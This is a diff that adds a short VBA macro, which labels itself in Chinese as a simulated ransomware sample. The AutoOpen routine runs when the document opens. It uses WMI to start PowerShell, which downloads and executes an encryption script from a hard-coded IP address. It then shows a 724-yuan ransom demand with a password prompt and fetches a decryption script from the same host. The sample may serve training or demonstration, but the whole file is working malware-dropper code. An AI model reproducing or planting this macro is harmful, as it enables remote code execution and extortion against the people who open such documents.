@@ -1,0 +1,20 @@
+Sub autoopen()
+       MsgBox ("你好！这是一个模拟勒索恶意代码！")
+       Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
+       Set Proc = Wmi.Get("Win32_process")
+       Proc.Create ("powershell11 -nop -c ""iex(New-Object Net.WebClient).DownloadString('http://114.55.92.40:8080/vba/download?fileName=ENC.ps1')""")
+       MsgBox "请您支付724元，以获得密码", , "密码是123456"
+       Call goLoop
+       Proc.Create ("powershell11 -nop -c ""iex(New-Object Net.WebClient).DownloadString('http://114.55.92.40:8080/vba/download?fileName=DEC.ps1')""")
+End Sub
+
+ Sub goLoop()
+        Do
+                 w = InputBox("请输入密码", "密码是123456")
+                 If w <> "123456" Then
+                       MsgBox "对不起，请您输入正确的密码"
+                 Else
+                        Exit Do
+                 End If
+         Loop
+End Sub
